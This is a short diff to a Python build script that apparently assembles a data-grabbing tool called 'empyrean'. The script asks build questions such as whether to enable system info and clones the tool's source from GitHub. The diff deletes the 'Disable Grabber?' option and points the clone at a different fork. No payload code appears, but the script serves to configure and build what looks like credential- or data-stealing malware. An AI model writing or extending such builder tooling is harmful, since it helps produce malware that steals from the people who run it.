@@ -51,12 +51,6 @@ def get_config() -> dict:
             "message": "Enable system info?",
             "default": True,
         },
-        {
-            "type": "confirm",
-            "name": "onerun",
-            "message": "Disable Grabber?",
-            "default": True,
-        },
     ]
 
     return prompt(questions)
@@ -76,7 +70,7 @@ class make_env:
         os.mkdir(self.build_dir)
 
     def get_src(self) -> None:
-        subprocess.run(['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir)
+        subprocess.run(['git', 'clone', 'https://github.com/aron2004HU/empyrean.git'], cwd=self.build_dir)
         shutil.move(os.path.join(self.build_dir, 'empyrean', 'src'), self.build_dir)
 
 class write_config:
